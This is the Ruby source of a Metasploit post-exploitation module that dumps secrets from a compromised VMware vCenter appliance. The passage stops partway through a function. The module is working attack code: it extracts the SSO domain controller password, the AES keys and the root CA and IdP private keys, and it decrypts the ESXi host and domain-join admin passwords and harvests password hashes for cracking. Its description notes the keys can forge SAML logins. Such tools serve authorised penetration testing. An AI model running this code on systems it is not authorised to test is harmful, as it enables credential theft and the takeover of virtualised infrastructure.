##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::Linux::Priv
  include Msf::Post::Vcenter::Vcenter
  include Msf::Post::Vcenter::Database

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Secrets Dump',
        'Description' => %q{
          Grab secrets and keys from the vCenter server and add them to
          loot. This module is tested against the vCenter appliance only;
          it will not work on Windows vCenter instances. It is intended to
          be run after successfully acquiring root access on a vCenter
          appliance and is useful for penetrating further into the
          environment following a vCenter exploit that results in a root
          shell.

          Secrets include the dcAccountDN and dcAccountPassword for
          the vCenter machine which can be used for maniuplating the SSO
          domain via standard LDAP interface; good for plugging into the
          vmware_vcenter_vmdir_ldap module or for adding new SSO admin
          users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with
          associated private keys are also plundered and can be used to
          sign forged SAML assertions for the /ui admin interface.
        },
        'Author' => [
          'npm[at]cesium137.io', # original vcenter secrets dump
          'Erik Wynter', # @wyntererik, postgres additions
          'h00die' # tying it all together
        ],
        'Platform' => [ 'linux', 'unix' ],
        'DisclosureDate' => '2022-04-15',
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'License' => MSF_LICENSE,
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Dump vCenter Secrets'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'References' => [
          [ 'URL', 'https://github.com/shmilylty/vhost_password_decrypt' ],
          [ 'CVE', '2022-22948' ],
          [ 'URL', 'https://pentera.io/blog/information-disclosure-in-vmware-vcenter/' ],
          [ 'URL', 'https://github.com/ErikWynter/metasploit-framework/blob/vcenter_gather_postgresql/modules/post/multi/gather/vmware_vcenter_gather_postgresql.rb' ]
        ],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ ],
          'SideEffects' => [ IOC_IN_LOGS ]
        }
      )
    )
    register_advanced_options([
      OptBool.new('DUMP_VMDIR', [ true, 'Extract SSO domain information', true ]),
      OptBool.new('DUMP_VMAFD', [ true, 'Extract vSphere certificates, private keys, and secrets', true ]),
      OptBool.new('DUMP_SPEC', [ true, 'If DUMP_VMAFD is enabled, attempt to extract VM Guest Customization secrets from PSQL', true ]),
      OptBool.new('DUMP_LIC', [ true, 'If DUMP_VMDIR is enabled, attempt to extract vSphere license keys', false ])
    ])
  end

  # this is only here because of the SSO portion, which will get moved to the vcenter lib once someone is able to provide output to test against.
  def ldapsearch_bin
    '/opt/likewise/bin/ldapsearch'
  end

  def psql_bin
    '/opt/vmware/vpostgres/current/bin/psql'
  end

  def vcenter_management
    vc_type_embedded || vc_type_management
  end

  def vcenter_infrastructure
    vc_type_embedded || vc_type_infrastructure
  end

  def check_cve_2022_22948
    # https://github.com/PenteraIO/CVE-2022-22948/blob/main/CVE-2022-22948-scanner.sh#L5
    cmd_exec('stat -c "%G" "/etc/vmware-vpx/vcdb.properties"') == 'cis'
  end

  def run
    get_vcsa_version

    if check_cve_2022_22948
      print_good('Vulnerable to CVE-2022-22948')
      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: ['CVE-2022-22948'],
        info: "Module #{fullname} found /etc/vmware-vpx/vcdb.properties owned by cis group"
      )
    end

    print_status('Validating target')
    validate_target

    print_status('Gathering vSphere SSO domain information')
    vmdir_init

    print_status('Extracting PostgreSQL database credentials')
    get_db_creds

    print_status('Extract ESXi host vpxuser credentials')
    enum_vpx_user_creds

    if datastore['DUMP_VMDIR'] && vcenter_infrastructure
      print_status('Extracting vSphere SSO domain secrets')
      vmdir_dump
    end

    if datastore['DUMP_VMAFD']
      print_status('Extracting certificates from vSphere platform')
      vmafd_dump
      if datastore['DUMP_SPEC'] && vcenter_management
        print_status('Searching for secrets in VM Guest Customization Specification XML')
        enum_vm_cust_spec
      end
    end

    if is_root?
      print_status('Retrieving .pgpass file')
      retrieved_pg_creds = false
      pgpass_contents = process_pgpass_file

      pgpass_contents.each do |p|
        extra_service_data = {
          address: p['hostname'] =~ /localhost|127.0.0.1/ ? Rex::Socket.getaddress(rhost) : p['hostname'],
          port: p['port'],
          service_name: 'psql',
          protocol: 'tcp',
          workspace_id: myworkspace_id,
          module_fullname: fullname,
          origin_type: :service
        }
        print_good(".pgpass creds found: #{p['username']}, #{p['password']} for #{p['hostname']}:#{p['database']}")
        store_valid_credential(user: p['username'], private: p['password'], service_data: extra_service_data, private_type: :password)
        next if p['database'] != 'postgres'

        next unless retrieved_pg_creds == false

        creds = query_pg_shadow_values(p['password'], p['username'], p['database'])
        retrieved_pg_creds = true unless creds.nil?
        creds.each do |cred|
          print_good("posgres database creds found: #{cred['user']}, #{cred['password_hash']}")
          credential_data = {
            username: cred['user'],
            private_data: cred['password_hash'],
            private_type: :nonreplayable_hash,
            jtr_format: Metasploit::Framework::Hashes.identify_hash(cred['password_hash'])
          }.merge(extra_service_data)

          login_data = {
            core: create_credential(credential_data),
            status: Metasploit::Model::Login::Status::UNTRIED
          }.merge(extra_service_data)

          create_credential_login(login_data)
        end
      end
      path = store_loot('.pgpass', 'text/plain', session, pgpass_contents, 'pgpass.json')
      print_good("Saving the /root/.pgpass contents to #{path}")
    end
  end

  def vmdir_init
    self.keystore = {}

    vsphere_machine_id = get_machine_id
    if is_uuid?(vsphere_machine_id)
      vprint_status("vSphere Machine ID: #{vsphere_machine_id}")
    else
      print_bad('Invalid vSphere PSC Machine UUID returned from vmafd-cli')
    end

    vsphere_domain_name = get_domain_name
    unless is_fqdn?(vsphere_domain_name)
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vSphere SSO domain name via lwregshell')
    end

    self.base_fqdn = vsphere_domain_name.to_s.downcase
    vprint_status("vSphere SSO Domain FQDN: #{base_fqdn}")

    vsphere_domain_dn = 'dc=' + base_fqdn.split('.').join(',dc=')
    self.base_dn = vsphere_domain_dn
    vprint_status("vSphere SSO Domain DN: #{base_dn}")

    vprint_status('Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter')
    vsphere_domain_dc_dn = get_domain_dc_dn
    unless is_dn?(vsphere_domain_dc_dn)
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountDN from lwregshell')
    end

    self.bind_dn = vsphere_domain_dc_dn
    print_good("vSphere SSO DC DN: #{bind_dn}")
    self.bind_pw = get_domain_dc_password
    unless bind_pw
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountPassword from lwregshell')
    end

    print_good("vSphere SSO DC PW: #{bind_pw}")
    # clean up double quotes
    # originally we wrapped in singles, but escaping of single quotes was not working, so prefer doubles
    self.bind_pw = bind_pw.gsub('"') { '\\"' }
    self.shell_bind_pw = "\"#{bind_pw}\""

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 389,
      service_name: 'ldap',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: base_fqdn
    }

    store_valid_credential(user: bind_dn, private: bind_pw, service_data: extra_service_data)

    get_aes_keys_from_host
  end

  def vmdir_dump
    print_status('Dumping vmdir schema to LDIF and storing to loot...')
    vmdir_ldif = get_ldif_contents(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
    if vmdir_ldif.nil?
      print_error('Error processing LDIF file')
      return
    end

    p = store_loot('vmdir', 'LDIF', rhost, vmdir_ldif, 'vmdir.ldif', 'vCenter vmdir LDIF dump')
    print_good("LDIF Dump: #{p}")

    print_status('Processing vmdir LDIF (this may take several minutes)')
    ldif_file = ::File.open(p, 'rb')
    ldif_data = Net::LDAP::Dataset.read_ldif(ldif_file)

    print_status('Processing LDIF entries')
    entries = ldif_data.to_entries

    print_status('Processing SSO account hashes')
    vmware_sso_hash_entries = entries.select { |entry| entry[:userpassword].any? }
    process_hashes(vmware_sso_hash_entries)

    print_status('Processing SSO identity sources')
    vmware_sso_id_entries = entries.select { |entry| entry[:vmwSTSConnectionStrings].any? }
    process_sso_providers(vmware_sso_id_entries)

    if datastore['DUMP_LIC']
      print_status('Extract licenses from vCenter platform')
      vmware_license_entries = entries.select { |entry| entry[:vmwLicSvcLicenseSerialKeys].any? }
      get_vc_licenses(vmware_license_entries)
    end
  end

  def vmafd_dump
    if vcenter_infrastructure
      get_vmca_cert
      get_idp_creds
    end

    vecs_stores = get_vecs_stores
    return if vecs_stores.nil?

    if vecs_stores.empty?
      print_error('Empty vecs-cli store list returned from vCenter')
      return
    end

    vecs_stores.each do |vecs_store|
      vecs_entries = get_vecs_entries(vecs_store)
      vecs_entries.each do |vecs_entry|
        next unless vecs_entry['Entry type'] == 'Private Key'

        get_vecs_entry(vecs_store, vecs_entry)
      end
    end
  end

  def get_vecs_entry(store_name, vecs_entry)
    store_label = store_name.upcase

    vprint_status("Extract #{store_label} key")
    key = get_vecs_private_key(store_name, vecs_entry['Alias'])
    if key.nil?
      print_bad("Could not extract #{store_label} private key")
    else
      p = store_loot(vecs_entry['Alias'], 'PEM', rhost, key.to_pem.to_s, "#{store_label}.key", "vCenter #{store_label} Private Key")
      print_good("#{store_label} Key: #{p}")
    end

    vprint_status("Extract #{store_label} certificate")
    cert = validate_x509_cert(vecs_entry['Certificate'])
    if cert.nil?
      print_bad("Could not extract #{store_label} certificate")
      return
    end
    p = store_loot(vecs_entry['Alias'], 'PEM', rhost, cert.to_pem.to_s, "#{store_label}.pem", "vCenter #{store_label} Certificate")
    print_good("#{store_label} Cert: #{p}")

    unless key.nil?
      update_keystore(cert, key)
    end
  end

  def get_vmca_cert
    vprint_status('Extract VMCA_ROOT key')

    unless file_exist?('/var/lib/vmware/vmca/privatekey.pem') && file_exist?('/var/lib/vmware/vmca/root.cer')
      print_error('Could not locate VMCA_ROOT keypair')
      return
    end

    vmca_key_b64 = read_file('/var/lib/vmware/vmca/privatekey.pem')

    vmca_key = validate_pkey(vmca_key_b64)
    if vmca_key.nil?
      print_error('Could not extract VMCA_ROOT private key')
      return
    end

    p = store_loot('vmca', 'PEM', rhost, vmca_key, 'VMCA_ROOT.key', 'vCenter VMCA root CA private key')
    print_good("VMCA_ROOT key: #{p}")

    vprint_status('Extract VMCA_ROOT cert')
    vmca_cert_b64 = read_file('/var/lib/vmware/vmca/root.cer')

    vmca_cert = validate_x509_cert(vmca_cert_b64)
    if vmca_cert.nil?
      print_error('Could not extract VMCA_ROOT certificate')
      return
    end

    unless vmca_cert.check_private_key(vmca_key)
      print_error('VMCA_ROOT certificate and private key mismatch')
      return
    end

    p = store_loot('vmca', 'PEM', rhost, vmca_cert, 'VMCA_ROOT.pem', 'vCenter VMCA root CA certificate')
    print_good("VMCA_ROOT cert: #{p}")

    update_keystore(vmca_cert, vmca_key)
  end

  # Shamelessly borrowed from vmware_vcenter_vmdir_ldap.rb
  def process_hashes(entries)
    if entries.empty?
      print_warning('No password hashes found')
      return
    end

    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: rhost,
      port: '389',
      protocol: 'tcp',
      service_name: 'vmdir/ldap'
    }

    entries.each do |entry|
      # This is the "username"
      dn = entry.dn

      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/middle-layer/password.c#L32-L76
      type, hash, salt = entry[:userpassword].first.unpack('CH128H32')

      case type
      when 1
        unless hash.length == 128
          vprint_error("Type #{type} hash length is not 128 digits (#{dn})")
          next
        end

        unless salt.length == 32
          vprint_error("Type #{type} salt length is not 32 digits (#{dn})")
          next
        end

        # https://github.com/magnumripper/JohnTheRipper/blob/2778d2e9df4aa852d0bc4bfbb7b7f3dde2935b0c/doc/DYNAMIC#L197
        john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
      else
        vprint_error("Hash type #{type.inspect} is not supported yet (#{dn})")
        next
      end

      print_good("vSphere SSO User Credential: #{dn}:#{john_hash}")

      create_credential(service_details.merge(
        username: dn,
        private_data: john_hash,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(john_hash)
      ))
    end
  end

  def process_sso_providers(entries)
    if entries.empty?
      print_warning('No SSO ID provider information found')
      return
    end

    if entries.is_a?(String)
      entries = entries.split("\n")
    end

    entries.each do |entry|
      sso_prov_type = entry[:vmwSTSProviderType].first
      sso_conn_str = entry[:vmwSTSConnectionStrings].first
      sso_user = entry[:vmwSTSUserName].first

      # On vCenter 7.x instances the tenant AES key was always Base64 encoded vs. plaintext, and vmwSTSPassword was missing from the LDIF dump.
      # It appears that vCenter 7.x does not return vmwSTSPassword even with appropriate LDAP flags - this is not like prior versions.
      # The data can still be extracted directly with ldapsearch syntax below which works in all versions, but is a PITA.
      vmdir_user_sso_pass = cmd_exec("#{ldapsearch_bin} -h #{vc_psc_fqdn} -LLL -p 389 -b \"cn=#{base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{base_dn}\" -D \"#{bind_dn}\" -w #{shell_bind_pw} \"(&(objectClass=vmwSTSIdentityStore)(vmwSTSConnectionStrings=#{sso_conn_str}))\" \"vmwSTSPassword\" | awk -F 'vmwSTSPassword: ' '{print $2}'").split("\n").last
      sso_pass = tenant_aes_decrypt(vmdir_user_sso_pass)

      sso_domain = entry[:vmwSTSDomainName].first

      sso_conn_uri = URI.parse(sso_conn_str)

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: sso_conn_uri.port,
        service_name: sso_conn_uri.scheme,
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: sso_domain
      }

      store_valid_credential(user: sso_user, private: sso_pass, service_data: extra_service_data)
      print_status('Found SSO Identity Source Credential:')
      print_good("#{sso_prov_type} @ #{sso_conn_str}:")
      print_good("\t  SSOUSER: #{sso_user}")
      print_good("\t  SSOPASS: #{sso_pass}")
      print_good("\tSSODOMAIN: #{sso_domain}")
    end
  end

  def get_aes_keys_from_host
    print_status('Extracting tenant and vpx AES encryption key...')

    tenant_key = get_aes_keys(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
    fail_with(Msf::Exploit::Failure::Unknown, 'Error extracting tenant and vpx AES encryption key') if tenant_key.nil?

    tenant_key.each do |aes_key|
      aes_key_len = aes_key.length
      # our first case is to process it out
      case aes_key_len
      when 16
        self.vc_tenant_aes_key = aes_key
        self.vc_tenant_aes_key_hex = vc_tenant_aes_key.unpack('H*').first
        vprint_status("vCenter returned a plaintext AES key: #{aes_key}")
      when 24
        self.vc_tenant_aes_key = Base64.strict_decode64(aes_key)
        self.vc_tenant_aes_key_hex = Base64.strict_decode64(aes_key).unpack('H*').first
        vprint_status("vCenter returned a Base64 AES key: #{aes_key}")
      when 64
        self.vc_sym_key = aes_key.scan(/../).map(&:hex).pack('C*')
        self.vc_sym_key_raw = aes_key
        print_good('vSphere vmware-vpx AES encryption')
        print_good("\tHEX: #{aes_key}")
      else
        print_error("Invalid tenant AES encryption key size - expecting 16 raw bytes or 24 Base64 bytes, got #{aes_key_len}")
        next
      end

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: base_fqdn
      }
      # our second case is to store it correctly
      case aes_key_len
      when 16, 24
        print_good('vSphere Tenant AES encryption')
        print_good("\tKEY: #{vc_tenant_aes_key}")
        print_good("\tHEX: #{vc_tenant_aes_key_hex}")

        store_valid_credential(user: 'STS AES key', private: vc_tenant_aes_key, service_data: extra_service_data.merge({
          port: 389,
          service_name: 'ldap'
        }))
      when 64
        store_valid_credential(user: 'VPX AES key', private: vc_sym_key_raw, service_data: extra_service_data.merge({
          port: 5432,
          service_name: 'psql'
        }))
      end
    end
  end

  def tenant_aes_decrypt(b64)
    # https://github.com/vmware/lightwave/blob/master/vmidentity/idm/server/src/main/java/com/vmware/identity/idm/server/CryptoAESE.java#L44-L45
    ciphertext = Base64.strict_decode64(b64)
    decipher = OpenSSL::Cipher.new('aes-128-ecb')
    decipher.decrypt
    decipher.padding = 0
    decipher.key = vc_tenant_aes_key
    return (decipher.update(ciphertext) + decipher.final).delete("\000")
  rescue StandardError => e
    elog('Error performing tenant_aes_decrypt', error: e)
    fail_with(Msf::Exploit::Failure::Unknown, 'Error performing tenant_aes_decrypt')
  end

  def update_keystore(public_key, private_key)
    if public_key.is_a? String
      cert = validate_x509_cert(public_key)
    else
      cert = public_key
    end
    if private_key.is_a? String
      key = validate_pkey(private_key)
    else
      key = private_key
    end
    cert_thumbprint = OpenSSL::Digest::SHA1.new(cert.to_der).to_s
    keystore[cert_thumbprint] = key
  rescue StandardError => e
    elog('Error updating module keystore', error: e)
    fail_with(Msf::Exploit::Failure::Unknown, 'Error updating module keystore')
  end

  def get_idp_creds
    vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP')
    idp_keys = get_idp_keys(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
    if idp_keys.nil?
      print_error('Error processing IdP trusted certificate private key')
      return
    end

    idp_certs = get_idp_certs(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
    if idp_certs.nil?
      print_error('Error processing IdP trusted certificate chain')
      return
    end

    vprint_status('Parsing vmwSTSTenantCredential certificates and keys')

    # vCenter vmdir stores the STS IdP signing credential under the following DN:
    #    cn=TenantCredential-1,cn=<sso domain>,cn=Tenants,cn=IdentityManager,cn=Services,<root dn>

    sts_cert = nil
    sts_key = nil
    sts_pem = nil
    idp_keys.each do |stskey|
      idp_certs.each do |stscert|
        next unless stscert.check_private_key(stskey)

        sts_cert = stscert.to_pem.to_s
        sts_key = stskey.to_pem.to_s
        if validate_sts_cert(sts_cert)
          vprint_status('Validated vSphere SSO IdP certificate against vSphere IDM tenant certificate')
        else # Query IDM to compare our extracted cert with the IDM advertised cert
          print_warning('Could not reconcile vmdir STS IdP cert chain with cert chain advertised by IDM - this credential may not work')
        end
        sts_pem = "#{sts_key}#{sts_cert}"
      end
    end

    unless sts_pem # We were unable to link a public and private key together
      print_error('Unable to associate IdP certificate and private key')
      return
    end

    p = store_loot('idp', 'application/x-pem-file', rhost, sts_key, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
    print_good("SSO_STS_IDP key: #{p}")

    p = store_loot('idp', 'application/x-pem-file', rhost, sts_cert, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
    print_good("SSO_STS_IDP cert: #{p}")

    update_keystore(sts_cert, sts_key)
  end

  def get_vc_licenses(entries)
    if entries.empty?
      print_warning('No vSphere Licenses Found')
      return
    end

    if entries.is_a?(String)
      entries = entries.split("\n")
    end

    entries.each do |entry|
      vc_lic_name = entry[:vmwLicSvcLicenseName].first
      vc_lic_type = entry[:vmwLicSvcLicenseType].first
      vc_lic_key = entry[:vmwLicSvcLicenseSerialKeys].first
      vc_lic_label = "#{vc_lic_name} #{vc_lic_type}"

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 443,
        service_name: 'https',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: base_fqdn
      }

      store_valid_credential(user: vc_lic_label, private: vc_lic_key, service_data: extra_service_data)
      print_good("\t#{vc_lic_label}: #{vc_lic_key}")
    end
  end

  def enum_vm_cust_spec
    vpx_customization_specs = get_vpx_customization_spec(shell_vcdb_pass, vcdb_user, vcdb_name)

    if vpx_customization_specs.nil?
      print_warning('No vpx_customization_spec entries evident')
      return
    end

    vpx_customization_specs.each do |spec|
      xmldoc = vpx_customization_specs[spec]

      unless (enc_cert_len = xmldoc.at_xpath('/ConfigRoot/encryptionKey/_length').text.to_i)
        print_error("Could not determine DER byte length for vpx_customization_spec '#{spec}'")
        next
      end

      enc_cert_der = []
      der_idx = 0

      print_status('Validating data encipherment key')
      while der_idx <= enc_cert_len - 1
        enc_cert_der << xmldoc.at_xpath("/ConfigRoot/encryptionKey/e[@id=#{der_idx}]").text.to_i
        der_idx += 1
      end

      enc_cert = validate_x509_cert(enc_cert_der.pack('C*'))
      if enc_cert.nil?
        print_error("Invalid encryption certificate for vpx_customization_spec '#{spec}'")
        next
      end

      enc_cert_thumbprint = OpenSSL::Digest::SHA1.new(enc_cert.to_der).to_s
      vprint_status("Secrets for '#{spec}' were encrypted using public certificate with SHA1 digest #{enc_cert_thumbprint}")

      unless (enc_keystore_entry = keystore[enc_cert_thumbprint])
        print_warning('Could not associate encryption public key with any of the private keys extracted from vCenter, skipping')
        next
      end

      vc_cipher_key = validate_pkey(enc_keystore_entry)
      if vc_cipher_key.nil?
        print_error("Could not access private key for VM Guest Customization Template '#{spec}', cannot decrypt")
        next
      end

      unless enc_cert.check_private_key(vc_cipher_key)
        print_error("vCenter private key does not associate with public key for VM Guest Customization Template '#{spec}', cannot decrypt")
        next
      end

      key_digest = OpenSSL::Digest::SHA1.new(vc_cipher_key.to_der).to_s
      vprint_status("Decrypt using #{vc_cipher_key.n.num_bits}-bit #{vc_cipher_key.oid} SHA1: #{key_digest}")

      # Check for static local machine password
      if (sysprep_element_unattend = xmldoc.at_xpath('/ConfigRoot/identity/guiUnattended'))
        next unless sysprep_element_unattend.at_xpath('//guiUnattended/password/plainText')

        secret_is_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/plainText').text

        case secret_is_plaintext.downcase
        when 'true'
          secret_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
        when 'false'
          secret_ciphertext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
          ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
          secret_plaintext = vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
        else
          print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
          next
        end
        print_status("Initial administrator account password found for vpx_customization_spec '#{spec}':")
        print_good("\tInitial Admin PW: #{secret_plaintext}")

        extra_service_data = {
          address: Rex::Socket.getaddress(rhost),
          port: 445,
          protocol: 'tcp',
          service_name: 'Windows',
          workspace_id: myworkspace_id,
          module_fullname: fullname,
          origin_type: :service,
          realm_key: Metasploit::Model::Realm::Key::WILDCARD,
          realm_value: '.'
        }

        store_valid_credential(user: '(local built-in administrator)', private: secret_plaintext, service_data: extra_service_data)
      end

      # Check for account used for domain join
      next unless (domain_element_unattend = xmldoc.at_xpath('//identification'))
      next unless domain_element_unattend.at_xpath('//identification/domainAdminPassword/plainText')

      secret_is_plaintext = domain_element_unattend.xpath('//identification/domainAdminPassword/plainText').text
      domain_user = domain_element_unattend.xpath('//identification/domainAdmin').text
      domain_base = domain_element_unattend.xpath('//identification/joinDomain').text

      case secret_is_plaintext.downcase
      when 'true'
        secret_plaintext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
      when 'false'
        secret_ciphertext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
        ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
        secret_plaintext = vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
      else
        print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
        next
      end

      print_status("AD domain join account found for vpx_customization_spec '#{spec}':")

      case domain_base.include?('.')
      when true
        print_good("\tAD User: #{domain_user}@#{domain_base}")
      when false
        print_good("\tAD User: #{domain_base}\\#{domain_user}")
      end
      print_good("\tAD Pass: #{secret_plaintext}")

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 445,
        protocol: 'tcp',
        service_name: 'Windows',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: domain_base
      }

      store_valid_credential(user: domain_user, private: secret_plaintext, service_data: extra_service_data)
    end
  end

  def enum_vpx_user_creds
    vpxuser_rows = get_vpx_users(shell_vcdb_pass, vcdb_user, vcdb_name, vc_sym_key)

    if vpxuser_rows.nil?
      print_warning('No ESXi hosts attached to this vCenter system')
      return
    end

    vpxuser_rows.each do |user|
      print_good("ESXi Host #{user['fqdn']} [#{user['ip']}]\t LOGIN: #{user['user']} PASS: #{user['password']}")

      extra_service_data = {
        address: user['ip'],
        port: 22,
        protocol: 'tcp',
        service_name: 'ssh',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: user['fqdn']
      }

      # XXX is this always root? store_valid_credential(user: 'root', private: user['password'], service_data: extra_service_data)
      store_valid_credential(user: user['user'], private: user['password'], service_data: extra_service_data)
    end
  end

  def get_db_creds
    db_properties = process_vcdb_properties_file

    self.vcdb_name = db_properties['name']
    self.vcdb_user = db_properties['username']
    self.vcdb_pass = db_properties['password']

    self.shell_vcdb_pass = "'#{vcdb_pass.gsub("'") { "\\'" }}'"

    print_good("\tVCDB Name: #{vcdb_name}")
    print_good("\tVCDB User: #{vcdb_user}")
    print_good("\tVCDB Pass: #{vcdb_pass}")

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 5432,
      service_name: 'psql',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: vcdb_name
    }

    store_valid_credential(user: vcdb_user, private: vcdb_pass, service_data: extra_service_data)
    print_status('Checking for VPX Users')
    creds = query_vpx_creds(vcdb_pass, vcdb_user, vcdb_name, vc_sym_key_raw)
    if creds.nil?
      print_bad('No VPXUSER entries were found')
      return
    end
    creds.each do |cred|
      extra_service_data = {
        address: cred['ip_address'],
        service_name: 'vpx',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: vcdb_name
      }
      if cred.key? 'decrypted_password'
        print_good("VPX Host creds found: #{cred['user']}, #{cred['decrypted_password']} for #{cred['ip_address']}")
        credential_data = {
          username: cred['user'],
          private_data: cred['decrypted_password'],
          private_type: :password
        }.merge(extra_service_data)
      else
        print_good("VPX Host creds found: #{cred['user']}, #{cred['password_hash']} for #{cred['ip_address']}")
        credential_data = {
          username: cred['user'],
          private_data: cred['password_hash'],
          private_type: :nonreplayable_hash
          # this is encrypted, not hashed, so no need for the following line, leaving it as a note
          # jtr_format: Metasploit::Framework::Hashes.identify_hash(cred['password_hash'])
        }.merge(extra_service_data)
      end

      login_data = {
        core: create_credential(credential_data),
        status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(extra_service_data)

      create_credential_login(login_data)
    end
  end

  def validate_sts_cert(test_cert)
    cert = validate_x509_cert(test_cert)
    return false if cert.nil?

    vprint_status('Downloading advertised IDM tenant certificate chain from http://localhost:7080/idm/tenant/ on local vCenter')

    idm_cmd = cmd_exec("curl -f -s http://localhost:7080/idm/tenant/#{base_fqdn}/certificates?scope=TENANT")

    if idm_cmd.blank?
      print_error('Unable to query IDM tenant information, cannot validate ssoserverSign certificate against IDM')
      return false
    end

    if (idm_json = JSON.parse(idm_cmd).first)
      idm_json['certificates'].each do |idm|
        cert_verify = validate_x509_cert(idm['encoded'])
        if cert_verify.nil?
          print_error('Invalid x509 certificate extracted from IDM!')
          return false
        end
        next unless cert == cert_verify

        return true
      end
    else
      print_error('Unable to parse IDM tenant certificates downloaded from http://localhost:7080/idm/tenant/ on local vCenter')
      return false
    end

    print_error('No vSphere IDM tenant certificates returned from http://localhost:7080/idm/tenant/')
    false
  end

  def validate_target
    if vcenter_management
      vc_db_type = get_database_type
      unless vc_db_type == 'embedded'
        fail_with(Msf::Exploit::Failure::NoTarget, "This module only supports embedded PostgreSQL, appliance reports DB type '#{vc_db_type}'")
      end

      unless command_exists?(psql_bin)
        fail_with(Msf::Exploit::Failure::NoTarget, "Could not find #{psql_bin}")
      end
    end

    self.vcenter_fqdn = get_fqdn
    if vcenter_fqdn.nil?
      print_bad('Could not determine vCenter DNS FQDN')
      self.vcenter_fqdn = ''
    end

    vsphere_machine_ipv4 = get_ipv4
    if vsphere_machine_ipv4.nil? || !Rex::Socket.is_ipv4?(vsphere_machine_ipv4)
      print_bad('Could not determine vCenter IPv4 address')
    else
      print_status("Appliance IPv4: #{vsphere_machine_ipv4}")
    end

    self.vc_psc_fqdn = get_platform_service_controller(vc_type_management)
    os, build = get_os_version

    print_status("Appliance Hostname: #{vcenter_fqdn}")
    print_status("Appliance OS: #{os}-#{build}")
    host_info = {
      host: session.session_host,
      name: vcenter_fqdn,
      os_flavor: os,
      os_sp: build,
      purpose: 'server',
      info: 'vCenter Server'
    }
    if os.downcase.include? 'linux'
      host_info[:os_name] = 'linux'
    end
    report_host(host_info)
  end

  def get_vcsa_version
    self.vc_type_embedded = false
    self.vc_type_infrastructure = false
    self.vc_type_management = false

    vcsa_type = get_deployment_type
    case vcsa_type
    when nil
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /etc/vmware/deployment.node.type')
    when 'embedded' # Integrated vCenter and PSC
      self.vc_deployment_type = 'vCenter Appliance (Embedded)'
      self.vc_type_embedded = true
    when 'infrastructure' # PSC only
      self.vc_deployment_type = 'vCenter Platform Service Controller'
      self.vc_type_infrastructure = true
    when 'management' # vCenter only
      self.vc_deployment_type = 'vCenter Appliance (Management)'
      self.vc_type_management = true
